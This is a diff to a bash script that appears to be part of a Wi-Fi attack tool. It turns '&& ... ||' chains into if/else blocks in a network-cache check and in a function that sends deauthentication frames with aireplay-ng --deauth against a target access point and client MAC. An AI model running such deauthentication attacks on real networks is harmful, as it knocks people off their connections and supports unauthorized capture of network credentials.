@@ -69,9 +69,11 @@ cmd_cap() {
         hdr "Network cache"
         init_meta
         if load_meta; then
-            (( META_LOADED == 1 )) \
-                && ok  "Fresh data - scan skipped." \
-                || warn "Stale cache - will re-verify on failure."
+            if (( META_LOADED == 1 )); then
+                ok  "Fresh data - scan skipped."
+            else
+                warn "Stale cache - will re-verify on failure."
+            fi
         else
             info "No cache for '${TARGET}' - full scan."
         fi
@@ -165,13 +167,15 @@ cmd_deth() {
     if [[ "$WAI_DRY_RUN" == "1" ]]; then
         dbg "[dry-run] aireplay-ng --deauth ${DEAUTH_N} -a ${TARGET} -c ${CLIENT_MAC} ${MON}"
     else
-        aireplay-ng \
+        if aireplay-ng \
             --deauth "$DEAUTH_N" \
             -a "$TARGET" \
             -c "$CLIENT_MAC" \
-            "$MON" > "$log" 2>&1 \
-            && ok "Deauth sent." \
-            || warn "aireplay-ng failed. Log:"
+            "$MON" > "$log" 2>&1; then
+            ok "Deauth sent."
+        else
+            warn "aireplay-ng failed. Log:"
+        fi
         while IFS= read -r l; do dbg "  $l"; done < "$log" || true
     fi
 }
